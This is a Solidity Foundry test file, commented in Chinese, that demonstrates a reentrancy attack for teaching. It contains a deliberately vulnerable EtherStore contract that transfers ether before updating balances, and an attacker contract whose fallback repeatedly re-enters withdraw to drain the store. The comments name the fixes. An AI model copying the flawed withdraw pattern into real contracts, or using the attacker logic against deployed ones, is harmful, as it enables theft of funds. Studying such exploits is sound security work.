// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

// 这个重入攻击只能发生在 0.8.0 以下的 solidity-version 中
// 解决方法:
// 1. 先修改状态,再转账
// 2. 加入互斥锁,限制一个方法不能被多次调用

import "forge-std/Test.sol";

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Not enough saving funds");

        (bool success,) = payable(msg.sender).call{value: _amount}("");
        require(success, "Failed to send Ether");

        // !!!错误: 转完账,再修改状态
        balances[msg.sender] -= _amount;
    }
}

contract Attacker is Test {
    EtherStore public etherStore;

    function setUp() public {
        etherStore = new EtherStore();
        vm.deal(address(etherStore), 5 ether);
        vm.deal(address(this), 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("EtherStore balance of ETH before exploit", address(etherStore).balance, 18);
        emit log_named_decimal_uint("Attacker balance of ETH before exploit", address(this).balance, 18);

        require(address(this).balance >= 1 ether, "Not enough Initial funds");

        etherStore.deposit{value: 1 ether}();

        etherStore.withdraw(1 ether);

        emit log_named_decimal_uint("EtherStore balance of ETH after exploit", address(etherStore).balance, 18);
        emit log_named_decimal_uint("Attacker balance of ETH after exploit", address(this).balance, 18);
    }

    // 重入攻击
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }
}
